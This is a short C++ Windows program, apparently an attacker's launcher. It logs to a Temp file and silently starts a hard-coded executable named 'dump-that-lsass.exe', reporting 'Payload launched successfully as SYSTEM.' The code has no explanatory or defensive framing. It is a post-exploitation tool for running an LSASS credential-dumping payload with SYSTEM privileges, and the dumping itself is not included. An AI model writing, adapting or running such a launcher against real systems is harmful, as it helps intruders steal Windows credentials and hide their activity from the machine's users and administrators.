#define UNICODE
#define _UNICODE
#include <windows.h>
#include <fstream>
#include <iostream>

void WriteLog(const std::string& message) {
    std::ofstream log("C:\\Windows\\Temp\\launcher.log", std::ios::app);
    log << message << std::endl;
    log.close();
}

int main() {
    LPCWSTR targetExe = L"C:\\dump-that-lsass.exe";  // Update as needed

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    WriteLog("[*] SYSTEM launcher starting...");

    BOOL result = CreateProcessW(
        targetExe,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (result) {
        WriteLog("[+] Payload launched successfully as SYSTEM.");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        DWORD err = GetLastError();
        WriteLog("[-] Failed to launch payload. Error: " + std::to_string(err));
    }

    return 0;
}
